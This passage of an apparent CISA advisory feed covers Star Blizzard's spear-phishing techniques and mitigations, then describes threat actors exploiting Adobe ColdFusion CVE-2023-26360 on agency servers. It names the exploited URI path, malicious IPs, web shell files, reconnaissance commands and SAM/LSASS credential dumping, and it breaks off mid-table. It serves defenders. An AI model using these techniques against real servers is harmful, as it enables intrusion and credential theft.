forwarding rules, giving them ongoing visibility of victim correspondence [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1114/003/\" title=\"Email Collection: Email Forwarding Rule\">T1114.003</a>].</p>\n<p>The actor has also used their access to a victim email account to access mailing<s>-</s>list data and a victim’s contacts list, which they then use for follow- on targeting. They have also used compromised email accounts for further phishing activity [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1586/002/\" title=\"Compromise Accounts: Email Accounts\">T1586.002</a>].</p>\n<h3><strong>CONCLUSION</strong></h3>\n<p>Spear-phishing is an established technique used by many actors, and Star Blizzard uses it successfully, evolving the technique to maintain their success.</p>\n<p>Individuals and organizations from previously targeted sectors should be vigilant of the techniques described in this advisory.</p>\n<p>In the UK you can <a href=\"https://report.ncsc.gov.uk/\" title=\"Report a Cyber Incident\">report related suspicious activity to the NCSC</a>.</p>\n<p>Information on effective defense against spear-phishing is included in the Mitigations section below.</p>\n<h3><strong>MITRE ATT&amp;CK<sup>®</sup></strong></h3>\n<p>This report has been compiled with respect to the <a href=\"https://attack.mitre.org/versions/v14/matrices/enterprise/\" title=\"Enterprise Matrix\">MITRE ATT&amp;CK<sup>®</sup></a> framework, a globally accessible knowledge base of adversary tactics and techniques based on real-world observations.</p>\n<table class=\"MsoTable15List3Accent3 tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap=\"\"><thead><tr><td>\n<p><strong>Tactic</strong></p>\n</td>\n<td>\n<p><strong>ID</strong></p>\n</td>\n<td>\n<p><strong>Technique</strong></p>\n</td>\n<td>\n<p><strong>Procedure</strong></p>\n</td>\n</tr></thead><tbody><tr><td>\n<p><strong>Reconnaissance</strong></p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1593/\" title=\"Search Open Websites/Domains\">T1593</a></p>\n</td>\n<td>\n<p>Search Open Websites/Domains</p>\n</td>\n<td>\n<p>Star Blizzard uses open-source research and social media to identify information about victims to use in targeting.</p>\n</td>\n</tr><tr><td>\n<p><strong>Reconnaissance</strong></p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1589/\" title=\"Gather Victim Identity Information\">T1589</a></p>\n</td>\n<td>\n<p>Gather Victim Identity Information</p>\n</td>\n<td>\n<p>Star Blizzard uses online data sets and open-source resources to gather information about their targets.</p>\n</td>\n</tr><tr><td>\n<p><strong>Resource Development</strong></p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1585/001/\" title=\"Establish Accounts: Social Media Accounts\">T1585.001</a></p>\n</td>\n<td>\n<p>Establish Accounts: Social Media Accounts</p>\n</td>\n<td>\n<p>Star Blizzard has been observed establishing fraudulent profiles on professional networking sites to conduct reconnaissance.</p>\n</td>\n</tr><tr><td>\n<p><strong>Resource Development</strong></p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1585/002/\" title=\"Establish Accounts: Email Accounts\">T1585.002</a></p>\n</td>\n<td>\n<p>Establish Accounts: Email Accounts</p>\n</td>\n<td>\n<p>Star Blizzard registers consumer email accounts matching the names of individuals they are impersonating to conduct spear-phishing activity.</p>\n</td>\n</tr><tr><td>\n<p><strong>Resource Development</strong></p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1583/001/\" title=\"Acquire Infrastructure: Domains\">T1583.001</a></p>\n</td>\n<td>\n<p>Acquire Infrastructure: Domains</p>\n</td>\n<td>\n<p>Star Blizzard registers domains to host their phishing framework.</p>\n</td>\n</tr><tr><td>\n<p><strong>Resource Development</strong></p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1586/002/\" title=\"Compromise Accounts: Email Accounts\">T1586.002</a></p>\n</td>\n<td>\n<p>Compromise Accounts: Email Accounts</p>\n</td>\n<td>\n<p>Star Blizzard has been observed using compromised victim email accounts to conduct spear-phishing activity against contacts of the original victim.</p>\n</td>\n</tr><tr><td>\n<p><strong>Initial Access</strong></p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1078/\" title=\"Valid Accounts\">T1078</a></p>\n</td>\n<td>\n<p>Valid Accounts</p>\n</td>\n<td>\n<p>Star Blizzard uses compromised credentials, captured from fake log- in pages, to log in to valid victim user accounts.</p>\n</td>\n</tr><tr><td>\n<p><strong>Initial Access</strong></p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1566/001/\" title=\"Phishing: Spearphishing Attachment\">T1566.001</a></p>\n</td>\n<td>\n<p>Phishing: Spear-phishing Attachment</p>\n</td>\n<td>\n<p>Star Blizzard uses malicious links embedded in email attachments to direct victims to their credential-stealing sites.</p>\n</td>\n</tr><tr><td>\n<p><strong>Initial Access</strong></p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1566/002/\" title=\"Phishing: Spearphishing Link\">T1566.002</a></p>\n</td>\n<td>\n<p>Phishing: Spear-phishing Link</p>\n</td>\n<td>\n<p>Star Blizzard sends spear-phishing emails with malicious links directly to credential-stealing sites, or to documents hosted on a file-sharing site, which then direct victims to credential-stealing sites.</p>\n</td>\n</tr><tr><td>\n<p><strong>Defense Evasion</strong></p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1550/004/\" title=\"Use Alternate Authentication Material: Web Session Cookie\">T1550.004</a></p>\n</td>\n<td>\n<p>Use Alternate Authentication Material: Web Session Cookie</p>\n</td>\n<td>\n<p>Star Blizzard bypasses multi-factor authentication on victim email accounts by using session cookies stolen using EvilGinx.</p>\n</td>\n</tr><tr><td>\n<p><strong>Credential Access</strong></p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1539/\" title=\"Steal Web Session Cookie\">T1539</a></p>\n</td>\n<td>\n<p>Steal Web Session Cookie</p>\n</td>\n<td>\n<p>Star Blizzard uses EvilGinx to steal the session cookies of victims directed to their fake log-in domains.</p>\n</td>\n</tr><tr><td>\n<p><strong>Collection</strong></p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1114/002/\" title=\"Email Collection: Remote Email Collection\">T1114.002</a></p>\n</td>\n<td>\n<p>Email Collection: Remote Email Collection</p>\n</td>\n<td>\n<p>Star Blizzard interacts directly with externally facing Exchange services, Office 365 and Google Workspace to access email and steal information using compromised credentials or access tokens.</p>\n</td>\n</tr><tr><td>\n<p><strong>Collection</strong></p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1114/003/\" title=\"Email Collection: Email Forwarding Rule\">T1114.003</a></p>\n</td>\n<td>\n<p>Email Collection: Email Forwarding Rule</p>\n</td>\n<td>\n<p>Star Blizzard abuses email- forwarding rules to monitor the activities of a victim, steal information, and maintain persistent access to victim's emails, even after compromised credentials are reset.</p>\n</td>\n</tr></tbody></table><h3><strong>MITIGATIONS</strong></h3>\n<p>A number of mitigations will be useful in defending against the activity described in this advisory.</p>\n<ul><li><strong>Use strong passwords. Use a separate password for email accounts and avoid password re-use across multiple services.</strong> See NCSC guidance: <a href=\"https://www.ncsc.gov.uk/collection/top-tips-for-staying-secure-online/use-a-strong-and-separate-password-for-email\" title=\"Top Tips for Staying Secure Online\">Top Tips for Staying Secure Online</a>.</li>\n<li><strong>Use multi-factor authentication</strong> (2-factor authentication/two-step authentication) to reduce the impact of password compromises. See NCSC guidance: <a href=\"https://www.ncsc.gov.uk/guidance/multi-factor-authentication-online-services\" title=\"Multi-factor Authentication for Online Services\">Multi-factor Authentication for Online Services</a> and <a href=\"https://www.ncsc.gov.uk/guidance/setting-2-step-verification-2sv\" title=\"Setting Up 2-Step Verification (2SV)\">Setting Up 2-Step Verification (2SV)</a>.</li>\n<li><strong>Protect your devices and networks by keeping them up to date:</strong> Use the latest supported versions, apply security updates promptly, use anti-virus and scan regularly to guard against known malware threats. See NCSC guidance: <a href=\"https://www.ncsc.gov.uk/collection/device-security-guidance/policies-and-settings/antivirus-and-other-security-software\" title=\"Device Security Guidance\">Device Security Guidance</a>.</li>\n<li><strong>Exercise vigilance.</strong> Spear-phishing emails are tailored to avoid suspicion. You may recognize the sender’s name, but has the email come from an address that you recognize? Would you expect contact from this person’s webmail address rather than their corporate email address? Has the suspicious email come to your personal/webmail address rather than your corporate one? Can you verify that the email is legitimate via another means? See NCSC guidance: <a href=\"https://www.ncsc.gov.uk/guidance/phishing\" title=\"Phishing attacks: Defending Your Organization\">Phishing attacks: Defending Your Organization</a> and <a href=\"https://www.ic3.gov/Home/IndustryAlerts\" title=\"Internet Crime Complaint Center(IC3) | Industry Alerts\">Internet Crime Complaint Center(IC3) | Industry Alerts</a>.</li>\n<li><strong>Enable your email providers’ automated email scanning features.</strong> These are turned on by default for consumer mail providers. See NCSC guidance: <a href=\"https://www.ncsc.gov.uk/blog-post/telling-users-to-avoid-clicking-bad-links-still-isnt-working\" title=\"Telling Users to &quot;Avoid Clicking Bad Links&quot; Still Isn’t Working\">Telling Users to \"Avoid Clicking Bad Links\" Still Isn’t Working</a>.</li>\n<li><strong>Disable mail-forwarding.</strong> Attackers have been observed to set up mail-forwarding rules to maintain visibility of target emails. If you cannot disable mail-forwarding, then monitor settings regularly to ensure that a forwarding rule has not been set up by an external malicious actor.</li>\n</ul><h3><strong>DISCLAIMER</strong></h3>\n<p>This report draws on information derived from NCSC and industry sources. Any NCSC findings and recommendations made have not been provided with the intention of avoiding all risks and following the recommendations will not remove all such risk. Ownership of information risks remains with the relevant system owner at all times.</p>\n<p>This information is exempt under the Freedom of Information Act 2000 (FOIA) and may be exempt under other UK information legislation.</p>\n<p>Refer any FOIA queries to <a href=\"mailto:ncscinfoleg@ncsc.gov.uk\" title=\"Freedom of Information Act Queries\">ncscinfoleg@ncsc.gov.uk</a>.</p>\n<p>All material is UK Crown Copyright<sup>©</sup>.</p>\n","pubDate":"Wed, 06 Dec 2023 15:18:57 EST","dc:creator":"CISA","guid":{"@isPermaLink":"false","#text":"/node/20446"}},{"title":"Threat Actors Exploit Adobe ColdFusion CVE-2023-26360 for Initial Access to Government Servers","link":"https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-339a","description":"<h3><strong>SUMMARY</strong></h3>\n<p>The Cybersecurity and Infrastructure Security Agency (CISA) is releasing a Cybersecurity Advisory (CSA) in response to confirmed exploitation of <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-26360\" title=\"CVE-2023-26360\">CVE-2023-26360</a> by unidentified threat actors at a Federal Civilian Executive Branch (FCEB) agency. This vulnerability presents as an improper access control issue impacting Adobe ColdFusion versions 2018 Update 15 (and earlier) and 2021 Update 5 (and earlier). CVE-2023-26360 also affects ColdFusion 2016 and ColdFusion 11 installations; however, they are no longer supported since they reached end of life. Exploitation of this CVE can result in arbitrary code execution. Following the FCEB agency’s investigation, analysis of network logs confirmed the compromise of at least two public-facing servers within the environment between June and July 2023.</p>\n<p>This CSA provides network defenders with tactics, techniques, and procedures (TTPs), indicators of compromise (IOCs), and methods to detect and protect against similar exploitation.</p>\n<p>Download the PDF version of this report:</p>\n\n\n\n\n\n<div class=\"c-file\">\n    <div class=\"c-file__download\">\n    <a href=\"/sites/default/files/2023-12/aa23-339a-threat-actors-exploit-adobe-coldfusion-cve-2023-26360.pdf\" class=\"c-file__link\" target=\"_blank\">AA23-339A Threat Actors Exploit Adobe ColdFusion CVE-2023-26360 for Initial Access to Government Servers</a>\n    <span class=\"c-file__size\">(PDF,       449.49 KB\n  )</span>\n  </div>\n</div>\n<p>For a downloadable copy of IOCs, see:</p>\n\n\n\n\n\n<div class=\"c-file\">\n    <div class=\"c-file__download\">\n    <a href=\"/sites/default/files/2023-12/AA23-339A.stix_.xml\" class=\"c-file__link\" target=\"_blank\">AA23-339A STIX XML</a>\n    <span class=\"c-file__size\">(XML,       23.83 KB\n  )</span>\n  </div>\n</div>\n\n\n\n\n\n<div class=\"c-file\">\n    <div class=\"c-file__download\">\n    <a href=\"/sites/default/files/2023-12/AA23-339A-Threat-Actors-Exploit-Adobe-ColdFusion-CVE-2023-26360-for-Initial-Access-to-Government-Servers.stix_.json\" class=\"c-file__link\" target=\"_blank\">AA23-339A STIX JSON</a>\n    <span class=\"c-file__size\">(JSON,       23.29 KB\n  )</span>\n  </div>\n</div>\n<h3><strong>TECHNICAL DETAILS</strong></h3>\n<p><strong>Note:</strong> This advisory uses the <a href=\"https://attack.mitre.org/versions/v14/\">MITRE ATT&amp;CK<sup>®</sup> for Enterprise</a> framework, version 14. See the MITRE ATT&amp;CK Tactics and Techniques section for tables mapped to the threat actors’ activity.</p>\n<h4><strong>Overview</strong></h4>\n<p>Adobe ColdFusion is a commercial application server used for rapid web-application development. ColdFusion supports proprietary markup languages for building web applications and integrates external components like databases and other third-party libraries. ColdFusion uses a proprietary language, ColdFusion Markup Language (CFML), for development but the application itself is built using JAVA.</p>\n<p>In June 2023, through the exploitation of CVE-2023-26360, threat actors were able to establish an initial foothold on two agency systems in two separate instances. In both incidents, Microsoft Defender for Endpoint (MDE) alerted of the potential exploitation of an Adobe ColdFusion vulnerability on public-facing web servers in the agency’s pre-production environment. Both servers were running outdated versions of software which are vulnerable to various CVEs. Additionally, various commands were initiated by the threat actors on the compromised web servers; the exploited vulnerability allowed the threat actors to drop malware using HTTP POST commands to the directory path associated with ColdFusion.</p>\n<p>Analysis suggests that the malicious activity conducted by the threat actors was a reconnaissance effort to map the broader network. No evidence is available to confirm successful data exfiltration or lateral movement during either incident. <strong>Note:</strong> It is unknown if the same or different threat actors were behind each incident.</p>\n<h4><strong>Incident 1</strong></h4>\n<p>As early as June 26, 2023, threat actors obtained an initial foothold on a public-facing [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1190/\" title=\"Exploit Public-Facing Application\">T1190</a>] web server running Adobe ColdFusion v2016.0.0.3 through exploitation of CVE-2023-26360. Threat actors successfully connected from malicious IP address <code>158.101.73[.]241</code>. <strong>Disclaimer: </strong>CISA recommends organizations investigate or vet this IP address prior to taking action, such as blocking. This IP resolves to a public cloud service provider and possibly hosts a large volume of legitimate traffic.</p>\n<p>The agency’s correlation of Internet Information Services (IIS) logs against open source[<a href=\"https://packetstormsecurity.com/files/172079/Adobe-ColdFusion-Unauthenticated-Remote-Code-Execution.html\" title=\"Adobe ColdFusion Unauthenticated Remote Code Execution\">1</a>] information indicates that the identified uniform resource identifier (URI) <code>/cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/iedit.cfc</code> was used to exploit CVE-2023-26360. The agency removed the asset from the network within 24 hours of the MDE alert.</p>\n<p>Threat actors started process enumeration to obtain currently running processes on the web server and performed a network connectivity check, likely to confirm their connection was successful. Following additional enumeration efforts to obtain information about the web server and its operating system [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1082/\" title=\"System Information Discovery\">T1082</a>], the threat actors checked for the presence of ColdFusion version 2018 [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1518/\" title=\"Software Discovery\">T1518</a>]—previous checks were also conducted against version 2016.</p>\n<p>Threat actors were observed traversing the filesystem [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1083/\" title=\"File and Directory Discovery\">T1083</a>] and uploading various artifacts to the web server [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1105/\" title=\"Ingress Tool Transfer\">T1105</a>], to include deleting the file <code>tat.cfm</code> [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1070/004/\" title=\"Indicator Removal: File Deletion\">T1070.004</a>]. <strong>Note: </strong>This file was deleted prior to the victim locating it on the host for analysis. Its characteristics and functionality are unknown. In addition:</p>\n<ul><li>Certutil[<a href=\"https://attack.mitre.org/versions/v13/software/S0160/\" title=\"certutil\">2</a>] was run against <code>conf.txt</code> [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1140/\" title=\"Deobfuscate/Decode Files or Information\">T1140</a>] and decoded as a web shell (<code>config.jsp</code>) [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1505/003/\" title=\"Server Software Component: Web Shell\">T1505.003</a>],[<a href=\"https://attack.mitre.org/versions/v14/techniques/T1036/008/\" title=\"Masquerading: Masquerade File Type\">T1036.008</a>]. <code>Conf.txt</code> was subsequently deleted, likely to evade detection.<br /><strong>Note: </strong>Threat actors were only observed interacting with the <code>config.jsp</code> web shell from this point on.</li>\n<li>HTTP POST requests [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1071/001/\" title=\"Application Layer Protocol: Web Protocols\">T1071.001</a>] were made to <code>config.cfm</code>, an expected configuration file in a standard installation of ColdFusion [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1036/005/\" title=\"Masquerading: Match Legitimate Name or Location\">T1036.005</a>]. Code review of <code>config.cfm</code> indicated malicious code—intended to execute on versions of ColdFusion 9 or less—was inserted with the intent to extract username, password, and data source uniform resource locators (URLs). According to analysis, this code insertion could be used in future malicious activity by the threat actors (e.g., by using the valid credentials that were compromised). This file also contained code used to upload additional files by the threat actors; however, the agency was unable to identify the source of their origin.</li>\n<li>Threat actors attempted to run <code>attrib.exe</code> to hide the newly created <code>config.jsp</code> web shell [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1564/001/\" title=\"Hide Artifacts: Hidden Files and Directories\">T1564.001</a>]. Analysis of this phase found no indication of successful execution.</li>\n<li>A small subset of events generated from various ColdFusion application logs identified that <code>tat.cfm</code>, <code>config.jsp</code>, and <code>system.cfm</code> failed to execute on the host due to syntax errors.</li>\n</ul><p>Threat actors created various files (see Table 1 below) in the C:\\IBM directory using the initialization process coldfusion.exe. None of these files were located on the server (possibly due to threat actor deletion) but are assessed as likely threat actor tools. Analysts assessed the C:\\IBM directory as a staging folder to support threat actors’ malicious operations.</p>\n<p><strong>Disclaimer:</strong> Organizations are encouraged to investigate the use of these files for related signs of compromise prior to performing remediation actions. Two artifacts are legitimate Microsoft files; threat actors were observed using these files following initial compromise for intended malicious purposes.</p>\n<table class=\"Table tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap=\"\"><caption><em>Table 1: Threat Actor Tools</em></caption>\n<thead><tr><th scope=\"col\" role=\"columnheader\" data-tablesaw-priority=\"persist\">\n<p><strong>File Name</strong></p>\n</th>\n<th scope=\"col\" role=\"columnheader\">\n<p><strong>Hash (SHA-1)</strong></p>\n</th>\n<th scope=\"col\" role=\"columnheader\">\n<p><strong>Description</strong></p>\n</th>\n</tr></thead><tbody><tr><td>\n<p>eee.exe</p>\n</td>\n<td>\n<p>b6818d2d5cbd902ce23461f24fc47e24937250e6</p>\n</td>\n<td>\n<p>VirusTotal[<a href=\"https://www.virustotal.com/gui/file/a3acb9f79647f813671c1a21097a51836b0b95397ebc9cd178bc806e1773c864/detection\" title=\"Virus Total GUI File\">3</a>] flags this file as malicious. This was located in D:\\$RECYCLE.BIN.</p>\n</td>\n</tr><tr><td>\n<p><a>edge.exe</a></p>\n</td>\n<td>\n<p>75a8ceded496269e9877c2d55f6ce13551d93ff4</p>\n</td>\n<td>\n<p>The dynamic-link library (DLL) file <code>msedge.dll</code> attempted to execute via <code>edge.exe</code> but received an error.</p>\n<p><strong>Note: </strong>This file is part of the official Microsoft Edge browser and is a cookie exporter.</p>\n</td>\n</tr><tr><td>\n<p>fscan.exe</p>\n</td>\n<td>\n<p>be332b6e2e2ed9e1e57d8aafa0c00aa77d4b8656</p>\n</td>\n<td>\n<p>Analysis confirmed at least three subnets were scanned using <code>fscan.exe</code>, which was launched from the C:\\IBM directory [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1046/\" title=\"Network Service Discovery\">T1046</a>].</p>\n</td>\n</tr><tr><td>\n<p>RC.exe</p>\n</td>\n<td>\n<p>9126b8320d18a52b1315d5ada08e1c380d18806b</p>\n</td>\n<td>\n<p><code>RCDLL.dll</code> attempted to execute via <code>RC.exe</code> but received an error.</p>\n<p><strong>Note:</strong> This file is part of the official Windows operating system and is called Microsoft Resource Compiler.</p>\n</td>\n</tr></tbody></table><p><strong>Note:</strong> The malicious code found on the system during this incident contained code that, when executed, would attempt to decrypt passwords for ColdFusion data sources. The seed value included in the code is a known value for ColdFusion version 8 or older—where the seed value was hard-coded. A threat actor who has control over the database server can use the values to decrypt the data source passwords in ColdFusion version 8 or older. The victim’s servers were running a newer version at the time of compromise; thus, the malicious code failed to decrypt passwords using the default hard-coded seed value for the older versions.</p>\n<h4><strong>Incident 2</strong></h4>\n<p>As early as June 2, 2023, threat actors obtained an initial foothold on an additional public-facing web server running Adobe ColdFusion v2021.0.0.2 via malicious IP address <code>125.227.50[.]97</code> through exploitation of CVE-2023-26360. Threat actors further enumerated domain trusts to identify lateral movement opportunities [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1482/\" title=\"Domain Trust Discovery\">T1482</a>] by using <code>nltest</code> commands. The threat actors also collected information about local [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1087/001/\" title=\"Account Discovery: Local Account\">T1087.001</a>] and domain [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1087/002/\" title=\"Account Discovery: Domain Account\">T1087.002</a>] administrative user accounts while performing reconnaissance by using commands such as <code>localgroup</code>, <code>net user</code>, <code>net user /domain</code>, and <code>ID</code>. Host and network reconnaissance efforts were further conducted to discover network configuration, time logs, and query user information.</p>\n<p>Threat actors were observed dropping the file <code>d.txt</code>—decoded as <code>d.jsp</code>—via POST command in addition to eight malicious artifacts (<code>hiddenfield.jsp</code>, <code>hiddenfield_jsp.class</code>, <code>hiddenfield_jsp.java</code>, <code>Connection.jsp</code>, <code>Connection_jsp.class</code>, <code>Connection_jsp.java</code>, <code>d_jsp.class</code>, and <code>d_jsp.java/</code>). According to open source information, <code>d.jsp</code> is a remote access trojan (RAT) that utilizes a JavaScript loader [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1059/007/\" title=\"Command and Scripting Interpreter: JavaScript\">T1059.007</a>] to infect the device and requires communication with the actor-controlled server to perform actions.[<a href=\"https://www.bleepingcomputer.com/news/security/stealthy-new-javascript-malware-infects-windows-pcs-with-rats/\" title=\"Stealthy new JavaScript malware infects Windows PCs with RATs\">4</a>] The agency’s analysis identified the trojan as a modified version of a publicly available web shell code.[<a href=\"https://github.com/Tas9er/ByPassGodzilla\" title=\"Tas9er / ByPassGodzilla\">5</a>] After maintaining persistence, threat actors periodically tested network connectivity by pinging Google’s domain name system (DNS) [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1016/001/\">T1016.001</a>]. The threat actors conducted additional reconnaissance efforts via searching for the <code>.jsp</code> files that were uploaded.</p>\n<p>Threat actors attempted to exfiltrate the (Registry) files <code>sam.zip</code>, <code>sec.zip</code>, <code>blank.jsp</code>, and <code>cf-bootstrap.jar</code>. Windows event logs identified the actors were not successful due to the malicious activity being detected and quarantined. An additional file (<code>sys.zip</code>) was created on the system; however, there were no indications of any attempt to exfiltrate it. Analysis identified these files resulted from executed save and compress data processes from the HKEY_LOCAL_MACHINE (HKLM) Registry key, as well as save security account manager (SAM) [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1003/002/\" title=\"OS Credential Dumping: Security Account Manager\">T1003.002</a>] information to .zip files. The SAM Registry file may allow for malicious actors to obtain usernames and reverse engineer passwords; however, no artifacts were available to confirm that the threat actors were successful in exfiltrating the SAM Registry hive.</p>\n<p>Windows event logs show that a malicious file (<code>1.dat</code>) was detected and quarantined. Analysis determined this file was a local security authority subsystem service (LSASS) dump [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1003/001/\" title=\"OS Credential Dumping: LSASS Memory\">T1003.001</a>] file that contained user accounts—to include multiple disabled credentials—and Windows new technology LAN manager (NTLM) passwords. The accounts were found on multiple servers across the victim’s network and were not successfully used for lateral movement.</p>\n<p>As efforts for reconnaissance continued, the threat actors changed their approach to using security tools that were present on the victim server. <code>Esentutl.exe</code>[<a href=\"https://attack.mitre.org/versions/v13/software/S0404/\" title=\"esentutl\">6</a>] was used to attempt this registry dump. Attempts to download data from the threat actors’ command and control (C2) server were also observed but blocked and logged by the victim server. Threat actors further attempted to access SYSVOL, which is used to deliver policy and logon scripts to domain members on an agency domain controller [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1484/001/\" title=\"Domain Policy Modification: Group Policy Modification\">T1484.001</a>]. The attempt was unsuccessful. Had the attempt succeeded, the threat actors may have been able to change policies across compromised servers.[<a href=\"https://social.technet.microsoft.com/wiki/contents/articles/8548.active-directory-sysvol-and-netlogon.aspx\" title=\"Active Directory: SYSVOL and NETLOGON\">7</a>]</p>\n<p><strong>Note: </strong>During this incident, analysis strongly suggests that the threat actors likely viewed the data contained in the ColdFusion seed.properties file via the web shell interface. The seed.properties file contains the seed value and encryption method used to encrypt passwords. The seed values can also be used to decrypt passwords. No malicious code was found on the victim system to indicate the threat actors attempted to decode any passwords using the values found in seed.properties file. Versions of ColdFusion 9 or greater use the seed.properties file, which contains unique seed values that can only be used on a single server.</p>\n<h3><strong>MITRE ATT&amp;CK TACTICS AND TECHNIQUES</strong></h3>\n<p>See Tables 2-9 for all referenced threat actor tactics and techniques for enterprise environments in this advisory. For assistance with mapping malicious cyber activity to the MITRE ATT&amp;CK framework, see CISA and MITRE ATT&amp;CK’s <a href=\"https://www.cisa.gov/news-events/news/best-practices-mitre-attckr-mapping\" title=\"Best Practices for MITRE ATT&amp;CK Mapping\">Best Practices for MITRE ATT&amp;CK Mapping</a> and CISA’s <a href=\"https://github.com/cisagov/Decider/\" title=\"cisagov / decider\">Decider Tool</a>.</p>\n<table class=\"Table tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap=\"\"><caption><em>Table 2: Initial Access</em></caption>\n<thead><tr><th scope=\"col\" role=\"columnheader\" data-tablesaw-priority=\"persist\">\n<p><strong>Technique Title</strong></p>\n</th>\n<th scope=\"col\" role=\"columnheader\">\n<p><strong>ID</strong></p>\n</th>\n<th scope=\"col\" role=\"columnheader\">\n<p><strong>Use</strong></p>\n</th>\n</tr></thead><tbody><tr><td>\n<p>Exploit Public-Facing Application</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1190/\" title=\"Exploit Public-Facing Application\">T1190</a></p>\n</td>\n<td>\n<p>Threat actors exploited two public-facing web servers running outdated versions of Adobe ColdFusion.</p>\n</td>\n</tr></tbody></table><table class=\"Table tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap=\"\"><caption><em>Table 3: Execution</em></caption>\n<thead><tr><th scope=\"col\" role=\"columnheader\" data-tablesaw-priority=\"persist\">\n<p><strong>Technique Title</strong></p>\n</th>\n<th scope=\"col\" role=\"columnheader\">\n<p><strong>ID</strong></p>\n</th>\n<th scope=\"col\" role=\"columnheader\">\n<p><strong>Use</strong></p>\n</th>\n</tr></thead><tbody><tr><td>\n<p>Command and Scripting Interpreter: JavaScript</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1059/007/\" title=\"Command and Scripting Interpreter: JavaScript\">T1059.007</a></p>\n</td>\n<td>\n<p>In correlation with open source information, analysis determined <code>d.jsp</code> is a RAT that utilizes a JavaScript loader to infect the device and requires communication with the actor-controlled server to perform actions.</p>\n</td>\n</tr></tbody></table><table class=\"Table tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap=\"\"><caption><em>Table 4: Persistence</em></caption>\n<thead><tr><th scope=\"col\" role=\"columnheader\" data-tablesaw-priority=\"persist\">\n<p><strong>Technique Title</strong></p>\n</th>\n<th scope=\"col\" role=\"columnheader\">\n<p><strong>ID</strong></p>\n</th>\n<th scope=\"col\" role=\"columnheader\">\n<p><strong>Use</strong></p>\n</th>\n</tr></thead><tbody><tr><td>\n<p>Server Software Component: Web Shell</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1505/003/\" title=\"Server Software Component: Web Shell\">T1505.003</a></p>\n</td>\n<td>\n<p>Threat actors uploaded various web shells to enable remote code execution and to execute commands on compromised web servers.</p>\n</td>\n</tr></tbody></table><table class=\"Table tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap=\"\"><caption><em>Table 5: Privilege Escalation</em></caption>\n<thead><tr><th scope=\"col\" role=\"columnheader\" data-tablesaw-priority=\"persist\">\n<p><strong>Technique Title</strong></p>\n</th>\n<th scope=\"col\" role=\"columnheader\">\n<p><strong>ID</strong></p>\n</th>\n<th scope=\"col\" role=\"columnheader\">\n<p><strong>Use</strong></p>\n</th>\n</tr></thead><tbody><tr><td>\n<p>Domain Policy Modification: Group Policy Modification</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1484/001/\" title=\"Domain Policy Modification: Group Policy Modification\">T1484.001</a></p>\n</td>\n<td>\n<p>Threat actors attempted to edit SYSVOL on an agency domain controller to change policies.</p>\n</td>\n</tr></tbody></table><table class=\"Table tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap=\"\"><caption><em>Table 6: Defense Evasion</em></caption>\n<thead><tr><th scope=\"col\" role=\"columnheader\" data-tablesaw-priority=\"persist\">\n<p><strong>Technique Title</strong></p>\n</th>\n<th scope=\"col\" role=\"columnheader\">\n<p><strong>ID</strong></p>\n</th>\n<th scope=\"col\" role=\"columnheader\">\n<p><strong>Use</strong></p>\n</th>\n</tr></thead><tbody><tr><td>\n<p>Masquerading: Match Legitimate Name or Location</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1036/005/\" title=\"Masquerading: Match Legitimate Name or Location\">T1036.005</a></p>\n</td>\n<td>\n<p>Threat actors inserted malicious code with the intent to extract username, password, and data source URLs into <code>config.cfm</code>—an expected configuration file in a standard 